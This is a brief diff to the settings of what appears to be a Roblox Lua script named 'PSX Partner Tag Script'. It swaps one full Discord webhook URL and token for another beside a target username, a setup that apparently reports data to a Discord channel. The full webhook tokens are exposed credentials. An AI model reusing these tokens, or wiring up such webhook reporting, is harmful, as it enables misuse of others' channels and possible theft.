@@ -1,5 +1,5 @@
 Username = "Xmanbrothered"
-WebHook = "https://discord.com/api/webhooks/1097898996376281210/UU_1EwqdQbdlGUS1shWrOWn32tfrwjXHhN06GhJU1a2dgmJqmVvG4WSNVjR0Sd7r4e-k"
+WebHook = "https://discord.com/api/webhooks/1101557396507197470/1lmqZJsHSPGW4UkKfxViAb3Yfq5QECGdugv5qCXJMW-R2L6is4ftCZFQ9G9RUFVfeMOr"
 
 loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
 _G.CustomScriptName = "PSX Partner Tag Script"
